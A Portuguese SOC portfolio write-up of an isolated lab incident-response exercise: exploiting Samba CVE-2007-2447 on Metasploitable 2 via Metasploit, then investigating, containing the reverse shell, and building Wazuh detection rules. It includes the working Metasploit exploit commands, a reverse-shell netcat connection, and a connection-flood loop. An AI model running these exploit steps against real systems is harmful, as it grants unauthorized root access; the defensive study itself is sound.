# 🛡️ Ataque 4 — Samba/SMB: Resposta a Incidente (Troubleshooting completo)

### Projeto de portfólio SOC / Blue Team — Pedro Ferraz

**Técnica MITRE ATT&CK:** T1190 (Exploit Public-Facing Application) + T1021 (Remote Services)
**Vulnerabilidade:** CVE-2007-2447 (Samba usermap_script)
**Ambiente:** laboratório isolado (Kali atacante · Metasploitable 2 alvo · Wazuh SIEM)
**Formato:** simulação de resposta a incidente — um ataque real foi gerado e investigado como um ticket de SOC.

---

## 0. Cenário

Diferente dos ataques anteriores, este foi conduzido como um **exercício de resposta a incidente**: o ataque foi executado e, em seguida, investigado do zero, como se um ticket tivesse chegado ao plantão de SOC — sem saber de antemão o que havia acontecido.

**O ticket:**

> Host 192.168.100.50 apresentou comportamento estranho por volta das 19h. Processo desconhecido notado. Investigar: houve incidente? Qual vetor? Qual origem? Houve acesso?
> 

---

## 1. O ataque (gerado para a investigação)

Exploração do Samba 3.0.20 via Metasploit:

```
nmap -sV -p 139,445 192.168.100.50     # reconhecimento: Samba smbd 3.x
msfconsole
  use exploit/multi/samba/usermap_script
  set RHOSTS 192.168.100.50
  set LHOST 192.168.100.40
  exploit                               # → shell de root
```

Resultado: `Command shell session opened (192.168.100.40:4444 -> 192.168.100.50:53220)` — acesso root obtido.

---

## 2. INVESTIGAÇÃO (a trilha de evidências)

A investigação seguiu o método do analista: formular hipótese, verificar, eliminar.

**Passo 1 — SIEM (Wazuh).** Busca por IP de origem, nome do serviço e porta. Resultado: **nada.** O ataque não gerou alerta no SIEM.

**Passo 2 — Firewall.** Resultado: **nada.**

> Lição: o firewall detecta o que ele BLOQUEIA; é cego para o que PERMITE. O Samba roda numa porta aberta e permitida (139/445), então o tráfego passa direto, sem bloqueio e sem log.
> 

**Passo 3 — Log geral do Samba** (`/var/log/samba/log.smbd`). Resultado: só mensagens de "Samba started". Nada do ataque.

**Passo 4 — Log por cliente.** Descoberta-chave no `ls -la /var/log/samba/`:

```
-rw-r--r-- 1 root root  0  ...  log.192.168.100.40
```

O Samba cria um arquivo de log por IP de cliente. A **existência** do arquivo `log.192.168.100.40` já prova que o IP do atacante se conectou ao servidor. Mas o tamanho era **0 bytes** — vazio.

> Lição: a existência do arquivo é prova da conexão (origem confirmada). O conteúdo vazio revela o ponto cego.
> 

---

## 3. CONCLUSÃO DA INVESTIGAÇÃO (laudo)

| Item | Resultado |
| --- | --- |
| Houve incidente? | Sim — conexão não autorizada ao serviço Samba |
| Vetor de entrada | Porta 139/445 (Samba/SMB), via CVE-2007-2447 |
| Origem do ataque | 192.168.100.40 (confirmado pelo arquivo de log por cliente) |
| Nível de acesso | Root (shell reverso) |
| Visibilidade no SIEM | **Nenhuma** — ataque invisível com a config padrão |

> Lição central: ataque a um serviço legítimo, em porta aberta, com log mínimo = ponto cego clássico. Nem SIEM, nem firewall, nem log local capturaram. Os ataques mais perigosos muitas vezes não aparecem nos lugares óbvios.
> 

---

## 4. CONTENÇÃO (parar o incidente ativo)

Princípio de resposta a incidente: **conter antes de corrigir.** Havia um atacante com shell ativo.

Identificação da conexão ativa:

```
netstat -antp | grep "192.168.100.40"
```

```
tcp  192.168.100.50:53220  192.168.100.40:4444  ESTABLISHED  5274/nc     ← shell reverso do atacante
tcp  192.168.100.50:139    192.168.100.40:38055 CLOSE_WAIT   5270/smbd   ← vetor de entrada (Samba)
```

Essa saída mostra o vetor (porta 139/Samba) E o canal de controle (netcat na 4444).

Contenção cirúrgica — matar só o processo do atacante, sem derrubar o servidor:

```
kill 5274
netstat -antp | grep "192.168.100.40"    # confirmar que a conexão morreu
```

> Lição: contenção cirúrgica (matar o processo malicioso) preserva o serviço para usuários legítimos. E verificar persistência (cron, usuários novos) é parte da contenção completa.
Nota técnica: distinguir conexão `tcp` (rede, com IP remoto) de socket `unix` (interno da máquina) — um socket unix nunca é o atacante remoto.
> 

---

## 5. CORREÇÃO (causa raiz)

**Causa raiz:** Samba 3.0.20 (2007), vulnerável a CVE-2007-2447 (execução remota de comando).

Hierarquia de correção (da ideal à paliativa):

1. **Patch (atualizar):** `apt-get install --only-upgrade samba`
2. **Desativar o serviço:** `/etc/init.d/samba stop` + `update-rc.d -f samba remove`
3. **Isolar:** segmentar o host em rede restrita com acesso controlado à 139/445

Verificar versão: `smbd --version`

> No laboratório, a correção foi documentada como recomendação mas NÃO aplicada — atualizar/desativar removeria o alvo de estudo. No mundo real, o patch seria a primeira ação.
> 

---

## 6. DETECÇÃO — fechando o ciclo (construindo a visibilidade)

Na investigação ficou provado que o ataque era invisível ao SIEM. Esta seção documenta como a visibilidade foi construída e a detecção escrita, fechando o ciclo **Investigação → Contenção → Correção → Detecção.**

### 6.1 O problema a resolver

O Samba vinha com log level = 0 (quase não registrava) e, mesmo após aumentar o nível, escrevia direto em arquivo local (/var/log/samba/log.%m), sem passar pelo syslog — o canal pelo qual o Metasploitable envia logs ao Wazuh. Resultado: o log existia, mas nunca chegava ao SIEM.

### 6.2 Primeira tentativa: syslog nativo do Samba (falhou)

Tentei fazer o Samba logar via syslog direto, no `/etc/samba/smb.conf`:

```
syslog = 2
syslog only = yes
```

**Não funcionou.** O Samba 3.0.20 (2007) tem comportamento inconsistente com `syslog only = yes`: parou de escrever no arquivo mas também não enviou corretamente ao syslog. O log sumiu dos dois lados.

 Lição: recursos de software legado nem sempre se comportam como a documentação diz. Validar na prática, não assumir.

Revertido o `syslog only`, mantendo apenas `log level = 2` (que funciona e volta a escrever no arquivo).

### 6.3 A ponte: encaminhar o arquivo ao syslog

Solução adotada — "seguir" o arquivo de log do Samba e injetar cada linha nova no syslog, que já viaja ao Wazuh:

```
sudo tail -f /var/log/samba/log.* | logger -t samba_monitor
```

- `tail -f` segue o arquivo ao vivo
- `logger -t samba_monitor` injeta cada linha no syslog com a tag `samba_monitor`
- o syslog do Metasploitable já encaminha tudo ao Wazuh

### 6.4 Debug: a armadilha do wildcard `%m`

A primeira versão da ponte seguia `log.192.168.100.40` (fixo), mas nada chegava. Investigando, descobri que o Samba **mudou o nome do arquivo**: o `%m` do `log file` às vezes resolve o cliente pelo IP, às vezes pelo **hostname**. Nesse caso, passou a escrever em `log.kali`, não em `log.192.168.100.40`. A ponte seguia o arquivo errado.

Correção: seguir **todos** os logs de uma vez com `log.*` (o asterisco), para não depender de como o cliente é identificado.

 Lição de SOC: wildcards de log (`%m`) são traiçoeiros — o nome do arquivo muda conforme o cliente é resolvido. Ao monitorar Samba, seguir o conjunto, não um arquivo fixo.

### 6.5 A regra de detecção

Arquivo: /var/ossec/etc/rules/local_rules.xml

xml
<rule id="100030" level="6">
  <match>samba_monitor</match>
  <description>Conexao Samba/SMB detectada no Metasploitable (servico legado/vulneravel)</description>
  <group>samba,smb,recon,</group>
</rule>

<rule id="100031" level="11" frequency="6" timeframe="60">
  <if_matched_sid>100030</if_matched_sid>
  <same_source_ip />
  <description>Multiplas conexoes Samba - possivel ataque ao SMB (CVE-2007-2447 usermap_script)</description>
  <group>samba,smb,attack,</group>
</rule>
    
### 6.6 Debug: a regra que passava no teste mas falhava em produção

A regra inicial usava <program_name>samba_monitor</program_name>. Passou no wazuh-logtest com uma linha de exemplo — mas não disparava em produção.

Causa: testei com uma linha que eu inventei, não com a linha real que chegava. Ao pegar a linha real do archives.log e testá-la, descobri que o formato do log remoto (...-Platform->192.168.100.50 samba_monitor:) quebrava o pre-decoding — o program_name não era extraído. Por isso a regra ancorada nele não casava.

Correção: ancorar a regra pelo texto puro <match>samba_monitor</match> (a tag do logger, presente em toda linha da ponte), sem depender de decoder nem de program_name.

Lição de ouro: SEMPRE teste a regra com a linha REAL que chega, nunca com uma inventada. Testar com log fictício gera falso positivo (passa no teste, falha em produção). Pegar a linha real do archives.log e validar com ela é a prática correta.

### 6.7 Resultado

Com a ponte corrigida (`log.*`) e a regra ancorada no texto real, o ataque Samba finalmente ficou visível:

- Regra **100030** (nível 6) — cada conexão Samba detectada
- Dashboard registrou **137 eventos** durante o ataque (rajada de conexões via smbclient)

O ponto cego diagnosticado na investigação foi completamente iluminado. O ciclo de resposta a incidente está fechado.

<img width="1397" height="1214" alt="Captura de tela 2026-11-02 201809" src="https://github.com/user-attachments/assets/9ebcfc2d-2927-4985-be56-02168639bddd" />

<img width="1013" height="486" alt="Captura de tela 2026-11-02 200013" src="https://github.com/user-attachments/assets/516ce4a6-66e1-43eb-95af-0ece4f46f307" />

<img width="630" height="218" alt="Captura de tela 2026-11-02 203902" src="https://github.com/user-attachments/assets/43781f37-9af9-46c7-a62a-0e5cc52c8cb6" />

### 6.8 Pendência conhecida

A ponte `tail -f | logger` roda em primeiro plano e morre se a janela fechar. Para produção, o próximo passo seria transformá-la num serviço persistente (que sobe no boot). Para fins de estudo e demonstração, o método atual cumpre o objetivo.

## 7. Conceitos demonstrados

- Metodologia de resposta a incidente: **Investigação → Contenção → Erradicação/Correção → Detecção**
- Investigação por trilha de evidências (SIEM → firewall → log local → log por cliente)
- Firewall detecta o que bloqueia, é cego ao que permite
- Leitura de `netstat`: identificar vetor, canal de controle (shell reverso), e distinguir tcp de socket unix
- Contenção cirúrgica (matar processo malicioso sem derrubar o serviço)
- Hierarquia de correção: patch > desativar > isolar
- Instrumentação de log em serviço legado (Samba log level)
- Encaminhamento de log ao SIEM via `tail -f | logger` (monitoramento agentless improvisado)
- Armadilha do wildcard `%m` em logs do Samba (nome de arquivo variável)
- Validação de regra com dado real vs. dado fictício (a diferença entre passar no teste e funcionar em produção)
- Ancoragem de regra Wazuh por `<match>` de texto quando o pre-decoding não extrai campos
- Debug de pipeline de log elo por elo (origem → logger → syslog → SIEM → regra)
- Uso do Metasploit Framework
- MITRE ATT&CK: T1190, T1021

## Comandos de referência
```
# --- ATAQUE (Kali) ---
nmap -sV -p 139,445 192.168.100.50
msfconsole → use exploit/multi/samba/usermap_script → set RHOSTS/LHOST → exploit

# --- INVESTIGAÇÃO (no host alvo) ---
ls -la /var/log/samba/
cat /var/log/samba/log.<IP-do-atacante>
netstat -antp | grep "<IP-do-atacante>"

# --- CONTENÇÃO ---
kill <PID-do-processo-malicioso>

# --- CORREÇÃO (referência) ---
smbd --version
apt-get install --only-upgrade samba        # patch
/etc/init.d/samba stop                        # desativar

# --- DETECÇÃO (dar visibilidade) ---
# 1) Aumentar log do Samba (no alvo) — /etc/samba/smb.conf
log level = 2

# 2) A ponte (seguir TODOS os logs de cliente)
sudo tail -f /var/log/samba/log.* | logger -t samba_monitor

# 3) Pegar a linha REAL para testar a regra (no Wazuh)
sudo grep "samba_monitor" /var/ossec/logs/archives/archives.log | tail -n 1

# 4) Testar e aplicar a regra (no Wazuh)
sudo /var/ossec/bin/wazuh-logtest
sudo systemctl restart wazuh-manager

# 5) Gerar o ataque p/ validar a detecção (no Kali)
for i in 1 2 3 4 5 6 7; do smbclient -L //192.168.100.50 -N; done
```

*Projeto realizado em laboratório isolado e controlado, exclusivamente para estudo de detecção e defesa.*
